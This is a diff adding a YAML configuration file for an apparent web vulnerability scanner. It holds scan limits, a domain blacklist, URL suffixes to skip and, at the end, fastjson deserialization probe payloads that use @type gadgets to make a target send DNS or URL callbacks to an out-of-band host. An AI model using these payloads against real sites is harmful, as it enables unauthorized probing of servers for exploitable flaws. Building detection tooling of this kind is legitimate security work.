@@ -1,0 +1,175 @@
+# 扫描配置
+scan:
+  # 问题数量
+  # 表示可以接收同一个站点多少个问题个数
+  # 超过次数以后就不在对该站点进行扫描了
+  # 0 表示无限次接收
+  issueNumber: 1
+  # 站点扫描次数
+  # 超过次数以后就不在对该站点进行扫描了
+  # 0 表示无限次扫描
+  siteScanNumber: 0
+  # 域名扫描规则
+  domainName:
+    # 域名黑名单
+    # 注: 黑名单优先级最高
+    # 注: 为空表示关闭该功能
+    # 使用规则:
+    # 1. 过滤某个域名: www.domain1.com
+    # 2. 过滤某个域名的全部子域名: *.domain2.com
+    # 3. 过滤某个域名的部分子域名: a.*.domain2.com/*.a.*.domain2.com
+    # 使用方法:
+    # blacklist:
+    #   - "www.domain1.com"
+    #   - "*.domain2.com"
+    blacklist:
+      - "*.dnslog.cn"
+      - "*.ceye.io"
+      - "*.fofa.so"
+      - "*.shodan.io"
+      - "*.github.com"
+    # 域名白名单
+    # 注: 黑名单优先级最高
+    # 注: 为空表示关闭该功能
+    # 使用规则:
+    # 1. 只扫描某个域名: www.domain1.com
+    # 2. 只扫描某个域名的全部子域名: *.domain2.com
+    # 3. 只扫描某个域名的部分子域名: a.*.domain2.com/*.a.*.domain2.com
+    # 使用方法:
+    # whitelist:
+    #   - "www.domain1.com"
+    #   - "*.domain2.com"
+    whitelist:
+
+
+# url黑名单后缀
+# url的后缀出现这些字段的都不进行测试
+urlBlackListSuffix:
+  config:
+    isStart: true
+  suffixList:
+    - "3g2"
+    - "3gp"
+    - "7z"
+    - "aac"
+    - "abw"
+    - "aif"
+    - "aifc"
+    - "aiff"
+    - "arc"
+    - "au"
+    - "avi"
+    - "azw"
+    - "bin"
+    - "bmp"
+    - "bz"
+    - "bz2"
+    - "cmx"
+    - "cod"
+    - "csh"
+    - "css"
+    - "csv"
+    - "doc"
+    - "docx"
+    - "eot"
+    - "epub"
+    - "gif"
+    - "gz"
+    - "ico"
+    - "ics"
+    - "ief"
+    - "jar"
+    - "jfif"
+    - "jpe"
+    - "jpeg"
+    - "jpg"
+    - "m3u"
+    - "mid"
+    - "midi"
+    - "mjs"
+    - "mp2"
+    - "mp3"
+    - "mpa"
+    - "mpe"
+    - "mpeg"
+    - "mpg"
+    - "mpkg"
+    - "mpp"
+    - "mpv2"
+    - "odp"
+    - "ods"
+    - "odt"
+    - "oga"
+    - "ogv"
+    - "ogx"
+    - "otf"
+    - "pbm"
+    - "pdf"
+    - "pgm"
+    - "png"
+    - "pnm"
+    - "ppm"
+    - "ppt"
+    - "pptx"
+    - "ra"
+    - "ram"
+    - "rar"
+    - "ras"
+    - "rgb"
+    - "rmi"
+    - "rtf"
+    - "snd"
+    - "svg"
+    - "swf"
+    - "tar"
+    - "tif"
+    - "tiff"
+    - "ttf"
+    - "vsd"
+    - "wav"
+    - "weba"
+    - "webm"
+    - "webp"
+    - "woff"
+    - "woff2"
+    - "xbm"
+    - "xls"
+    - "xlsx"
+    - "xpm"
+    - "xul"
+    - "xwd"
+    - "zip"
+    - "js"
+    - "wmv"
+    - "asf"
+    - "asx"
+    - "rm"
+    - "rmvb"
+    - "mp4"
+    - "mov"
+    - "m4v"
+    - "dat"
+    - "mkv"
+    - "flv"
+    - "vob"
+    - "txt"
+    - "php"
+    - "asp"
+
+# 应用程序配置
+application:
+  # 应用名称
+  fastjson:
+    payloads:
+      errDetect:
+        - "{\"@type\": \"java.lang.AutoCloseable\""
+      netDetect:
+        - "{\"name\":{\"@type\":\"java.net.Inet4Address\",\"val\":\"NETOUT_.%s\"}"
+      autoTypeDetect:
+        - "[{\"@type\":\"java.net.CookiePolicy\"},{\"@type\":\"java.net.Inet4Address\",\"val\":\"AUTOTYPE_.%s\"}]"
+      dnsDetect48:
+        - "[{\"@type\":\"java.lang.Class\",\"val\":\"java.io.ByteArrayOutputStream\"},{\"@type\":\"java.io.ByteArrayOutputStream\"},{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"48_.%s\"}}]"
+      dnsDetect68:
+        - "{\"a\": {\"@type\": \"java.lang.AutoCloseable\",\"@type\": \"com.alibaba.fastjson.JSONReader\",\"reader\": {\"@type\": \"jdk.nashorn.api.scripting.URLReader\",\"url\": \"http://68_.%s\"}}}"
+      desDetect80:
+        - "[{\"@type\":\"java.lang.Exception\",\"@type\":\"com.alibaba.fastjson.JSONException\",\"x\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"80_.%s\"}}},{\"@type\":\"java.lang.Exception\",\"@type\":\"com.alibaba.fastjson.JSONException\",\"message\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"83_.%s\"}}}]"
